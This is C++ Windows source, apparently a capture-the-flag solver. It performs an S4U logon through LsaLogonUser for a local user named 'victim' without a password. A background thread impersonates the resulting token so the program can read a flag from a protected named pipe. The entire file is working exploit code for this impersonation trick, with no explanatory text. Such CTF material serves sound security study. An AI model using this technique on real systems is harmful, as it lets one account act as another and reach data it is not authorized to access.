#include "stdafx.h"
#include <cstdio>
#include <Windows.h>
#include <NTSecAPI.h>
//#include <ntstatus.h>

#define NT_SUCCESS(x) (((LONG)(x)) >= 0)

//char PKGNAME[] = "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0";
char PKGNAME[] = "Negotiate";
char ORIGIN[] = "S4UWin";
TCHAR user[] = TEXT("victim");
//TCHAR user[] = TEXT("test");
TCHAR realm[] = TEXT("DESKTOP-BSP6USV");
#define PIPE_NAME TEXT("\\\\.\\pipe\\flag_server")

#pragma comment(lib, "Secur32.lib")

PVOID halloc(SIZE_T size) {
	return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size);
}

VOID hfree(PVOID ptr) {
	HeapFree(GetProcessHeap(), 0, ptr);
}

BOOL GetWorkgroupName(TCHAR** pWorkgroupName, LPDWORD pSize) {
	static TCHAR WorkgroupName[100];
	DWORD Size = sizeof(WorkgroupName);

	if (!GetComputerNameEx(ComputerNameNetBIOS, WorkgroupName, &Size)) {
		return FALSE;
	}
	*pSize = Size;
	*pWorkgroupName = WorkgroupName;
	
	return TRUE;
}

HANDLE LogonS4U(TCHAR* user, TCHAR* realm) {
#pragma warning(disable:4267)
#pragma warning(disable:4244)
	LSA_HANDLE LsaHandle;
	ULONG authpkg;
	LSA_STRING pkgname, originName;
	PKERB_S4U_LOGON logon_data;
	TCHAR* userptr, *realmptr;
	TOKEN_SOURCE ts;

	if (!NT_SUCCESS(LsaConnectUntrusted(&LsaHandle))) {
		return NULL;
	}

	pkgname.Buffer = PKGNAME;
	pkgname.Length = strlen(PKGNAME);
	pkgname.MaximumLength = strlen(PKGNAME) + 1;
	if (!NT_SUCCESS(LsaLookupAuthenticationPackage(LsaHandle, &pkgname, &authpkg))) {
		LsaClose(LsaHandle);
		return NULL;
	}

	SIZE_T alloc_size = sizeof(KERB_S4U_LOGON) + (wcslen(user) + 1) * sizeof(TCHAR) + (wcslen(realm) + 1) * sizeof(TCHAR);
	logon_data = reinterpret_cast<PKERB_S4U_LOGON>(halloc(alloc_size));
	userptr = reinterpret_cast<TCHAR*>(logon_data + 1);
	realmptr = (userptr + (wcslen(user) + 1));

	memcpy(userptr, user, (wcslen(user) + 1) * sizeof(TCHAR));
	memcpy(realmptr, realm, (wcslen(realm) + 1) * sizeof(TCHAR));

	logon_data->ClientUpn.Buffer = userptr;
	logon_data->ClientUpn.Length = wcslen(user) * sizeof(TCHAR);
	logon_data->ClientUpn.MaximumLength = wcslen(user) * sizeof(TCHAR);

	logon_data->ClientRealm.Buffer = realmptr;
	logon_data->ClientRealm.Length = wcslen(realm) * sizeof(TCHAR);
	logon_data->ClientRealm.MaximumLength = wcslen(realm) * sizeof(TCHAR);

	logon_data->MessageType = KerbS4ULogon;
	logon_data->Flags = 0;

	originName.Buffer = ORIGIN;
	originName.Length = strlen(ORIGIN);
	originName.MaximumLength = strlen(ORIGIN) + 1;

	strcpy_s(ts.SourceName, "S4UWin");
	AllocateLocallyUniqueId(&ts.SourceIdentifier);

	PVOID pb;
	ULONG pbl;
	LUID logonid;
	HANDLE token;
	QUOTA_LIMITS quotas;
	NTSTATUS substat;
	NTSTATUS s = LsaLogonUser(LsaHandle, &originName, Network, authpkg, logon_data, alloc_size, NULL, &ts, &pb, &pbl, &logonid, &token, &quotas, &substat);
	if (!NT_SUCCESS(s)) {
		printf("%x\n", s);
		hfree(logon_data);
		LsaClose(LsaHandle);
		return NULL;
	}

	LsaClose(LsaHandle);
	LsaFreeReturnBuffer(pb);
	return token;
}

DWORD WINAPI nullThread(LPVOID param) {
	HANDLE imptoken;
	TCHAR* current_realm;
	DWORD size;
	
	if (!GetWorkgroupName(&current_realm, &size)) {
		printf("Cannot get NetBIOS name...\n");
		return -1;
	}
	printf("%ws\n", current_realm);

	imptoken = LogonS4U(user, current_realm);
	if (!imptoken) {
		printf("Failed logon s4u...\n");
		return -1;
	}
	if (!ImpersonateLoggedOnUser(imptoken)) {
		printf("Failed impersonation...\n");
		return -1;
	}
	while (true) {
		Sleep(1000);
	}

	return 0;
}

void solve(void) {
	HANDLE hPipe = INVALID_HANDLE_VALUE;
	char buffer[100];
	DWORD read;
	HANDLE hThread;
	DWORD ltid;

	hThread = CreateThread(NULL, 0, nullThread, NULL, 0, &ltid);
	if (!hThread) {
		printf("Failed creating thread...\n");
		return;
	}
	Sleep(1000);	// wait for s4u logon

	ZeroMemory(buffer, 100);
	hPipe = CreateFile(PIPE_NAME, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hPipe == INVALID_HANDLE_VALUE) {
		printf("Failed creating pipe...%d\n", GetLastError());
		return;
	}
	if (!ReadFile(hPipe, buffer, 100, &read, NULL)) {
		printf("Failed read from pipe...\n");
		CloseHandle(hPipe);
		return;
	}
	printf("Result : %s\n", buffer);
	CloseHandle(hPipe);

	TerminateThread(hThread, 0);
	return;
}

int main() {
	solve();
	return 0;
}
